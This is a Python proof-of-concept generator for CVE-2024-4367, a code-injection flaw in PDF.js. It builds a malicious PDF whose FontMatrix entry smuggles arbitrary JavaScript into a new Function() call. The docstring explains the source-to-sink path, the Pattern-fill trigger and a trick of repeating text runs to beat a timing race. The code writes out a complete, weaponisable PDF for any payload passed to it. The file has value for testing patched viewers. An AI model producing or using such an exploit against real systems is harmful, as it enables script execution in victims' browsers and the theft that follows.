#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2024-4367 PoC generator v3 — correct xref offsets + repeated font usage.

Design notes
------------
* Sink:  pdf.min.js getPathGenerator -> new Function("c","size", code)
* Source: FontMatrix array element (PDF literal string) flows via
          worker compileGlyph -> {cmd:"transform", args: fontMatrix.slice()}
          -> main-thread getPathGenerator args.join(",") -> code body.
* Trigger: worker handleText only emits FontPath commonobjs when
          (textRenderingMode & ADD_TO_PATH) || disableFontFace || fillColorSpace=="Pattern".
          We use a Pattern fill (/Pattern cs, /P1 scn) to satisfy the third arm.
* Race: main-thread paintChar calls getPathGenerator only after the
          "<loadedName>_path_<char>" commonobj has arrived. Repeating the same
          font across many text runs gives later paints another chance, which
          removes the one-shot race seen with a single text run.
* Escaping: inside a PDF literal string only ( ) \\ need escaping.
"""
import sys

BACKSLASH = "\\"


def build(payload):
    fmt = payload.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
    font_matrix = "/FontMatrix [0.1 0 0 0.1 0 (1" + BACKSLASH + ");\n" + fmt + "\n//)]"

    lines = ["47 379 489 230 re S", "/Pattern cs", "BT", "  50 760 Td", "  117 TL", "  /F1 60 Tf", "  /P1 scn"]
    for _ in range(12):
        lines.append("  (AbCdEf) Tj")
        lines.append("  (AbCdEf) '")
    lines.append("ET")
    content = "\n".join(lines) + "\n"

    objs = {}

    objs[1] = "<<\n/Pages 2 0 R\n/Type/Catalog\n/OpenAction[3 0 R /Fit]\n>>"
    objs[2] = "<<\n/Kids[3 0 R]\n/Type/Pages\n/Count 1\n>>"
    objs[3] = (
        "<<\n/Type/Page\n/Resources 4 0 R\n/Contents 6 0 R\n"
        "/Parent 2 0 R\n/MediaBox[0 0 595.2756 841.8898]\n>>"
    )
    objs[4] = "<<\n/Pattern<<\n  /P1 7 0 R\n  /P2 8 0 R\n>>\n/Font<<\n  /F1 5 0 R\n>>\n>>"
    objs[5] = (
        "<<\n"
        "/Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341]\n"
        "/Type/Font\n/BaseFont/PAXEKO+SourceSansPro-Bold\n/LastChar 102\n"
        "/Encoding/WinAnsiEncoding\n"
        + font_matrix
        + "\n/Subtype/Type1\n/FirstChar 65\n/FontDescriptor 9 0 R\n>>"
    )
    objs[6] = "<<\n/Length %d\n>>\nstream\n%s endstream" % (len(content), content)
    objs[7] = (
        "<<\n/PatternType 1\n/Matrix[1 0 0 1 50 0]\n/Length 58\n/TilingType 1\n"
        "/BBox[0 0 16 16]\n/YStep 16\n/PaintType 1\n/Resources<<\n>>\n/XStep 16\n>>\n"
        "stream\n0.65 g\n0 0 16 16 re f\n0.15 g\n0 0 8 8 re f\n8 8 8 8 re f\nendstream"
    )
    objs[8] = (
        "<<\n/PatternType 2\n/Shading<<\n  /Function<<\n    /Domain[0 1]\n"
        "    /C0[0 0 1]\n    /C1[1 0.6 0]\n    /N 1\n    /FunctionType 2\n  >>\n"
        "  /ShadingType 2\n  /Coords[46 400 537 400]\n  /Extend[false false]\n"
        "  /ColorSpace/DeviceRGB\n>>\n/Type/Pattern\n>>"
    )
    objs[9] = (
        "<<\n/Type/FontDescriptor\n/ItalicAngle 0\n/Ascent 751\n"
        "/FontBBox[-6 -12 579 713]\n/FontName/PAXEKO+SourceSansPro-Bold\n"
        "/StemV 100\n/CapHeight 713\n/Flags 32\n/FontFile3 10 0 R\n"
        "/Descent -173\n/MissingWidth 250\n>>"
    )
    objs[10] = "<<\n/Length 800\n/Subtype/Type2\n>>\nstream\n\nendstream"

    out = bytearray(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")
    offsets = {}
    for num in sorted(objs):
        offsets[num] = len(out)
        out += ("%d 0 obj\n" % num).encode("latin-1")
        out += objs[num].encode("latin-1")
        out += b"\nendobj\n"

    xref_pos = len(out)
    maxn = max(objs)
    out += ("xref\n0 %d\n" % (maxn + 1)).encode("latin-1")
    out += b"0000000000 65535 f \n"
    for num in range(1, maxn + 1):
        if num in offsets:
            out += ("%010d 00000 n \n" % offsets[num]).encode("latin-1")
        else:
            out += b"0000000000 65535 f \n"
    out += (
        "trailer\n<<\n/Size %d\n/Root 1 0 R\n>>\nstartxref\n%d\n%%%%EOF\n"
        % (maxn + 1, xref_pos)
    ).encode("latin-1")
    return bytes(out)


if __name__ == "__main__":
    out_path = sys.argv[1]
    payload = sys.argv[2] if len(sys.argv) > 2 else "window.__pdfjs_pwn=1;console.log('PDFJS_XSS_HIT')"
    data = build(payload)
    with open(out_path, "wb") as f:
        f.write(data)
    print("[+] %s  %d bytes  payload=%r" % (out_path, len(data), payload))
